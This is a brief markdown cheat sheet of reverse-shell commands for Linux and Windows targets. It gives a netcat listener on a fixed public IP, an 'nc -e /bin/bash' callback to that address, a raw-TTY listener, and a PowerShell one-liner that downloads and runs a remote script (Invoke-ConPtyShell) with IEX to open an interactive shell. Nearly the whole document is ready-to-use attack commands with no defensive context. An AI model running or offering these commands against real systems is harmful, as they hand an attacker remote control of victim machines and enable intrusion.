#### **Linux Reverse Shell Listener**
##### l = listen, n = ip address only (no dns), v = verbose, p = port

```powershell
nc -lnvp 87 -s 69.164.204.158
```

#### Linux Target Reverse Shell Connection
##### (-e is an legacy command, if it doesn't work remove -e)

```powershell
nc -e /bin/bash 69.164.204.158 87
```

#### Linux Reverse Shell Listener for Windows
```powershell
stty raw -echo; (stty size; cat) | nc -lnvp 87 -s 69.164.204.158
```

##### Windows Reverse Shell Connection
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```
